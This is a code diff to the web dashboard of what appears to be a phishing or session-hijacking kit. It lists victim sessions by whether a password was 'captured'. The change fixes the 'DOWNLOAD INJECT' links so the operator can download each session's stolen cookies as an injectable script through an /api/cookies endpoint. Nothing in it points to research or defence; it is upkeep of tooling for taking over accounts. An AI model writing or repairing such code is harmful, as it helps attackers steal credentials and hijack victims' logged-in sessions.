@@ -935,8 +935,8 @@
                             </div>
                         `;
                     } else if (session.status === 'valid') {
-                        // Valid session but no password captured
-                        passwordColumn = `<span style="color: #ffaa00; font-weight: bold;">⚠️ NO PASSWORD CAPTURED</span>`;
+                        // Valid session but no password captured - check if it might be in the session file
+                        passwordColumn = `<span style="color: #ffaa00; font-weight: bold;">⚠️ PASSWORD NOT DISPLAYED</span>`;
                     } else if (session.status === 'invalid') {
                         // Invalid entry - show the reason
                         const reason = session.reason || 'FAILED ENTRY';
@@ -946,11 +946,18 @@
                         passwordColumn = `<span style="color: #666;">N/A - NO PASSWORD</span>`;
                     }
 
-                    // Handle inject script column
+                    // Handle inject script column - fix the download URL
                     let injectColumn = '';
                     if (session.status === 'valid' && session.injectFilename) {
-                        injectColumn = `<a href="/api/admin/download-inject/${session.injectFilename}?token=${encodeURIComponent(getStoredToken())}" 
-                                           class="download-btn" download>
+                        injectColumn = `<a href="/api/cookies/${session.id}?token=${encodeURIComponent(getStoredToken())}" 
+                                           class="download-btn" download="${session.injectFilename}">
+                                            DOWNLOAD INJECT
+                                        </a>`;
+                    } else if (session.status === 'valid' && session.id) {
+                        // Try to construct injection filename from session ID
+                        const injectFilename = `inject_session_${session.id}.js`;
+                        injectColumn = `<a href="/api/cookies/${session.id}?token=${encodeURIComponent(getStoredToken())}" 
+                                           class="download-btn" download="${injectFilename}">
                                             DOWNLOAD INJECT
                                         </a>`;
                     } else {
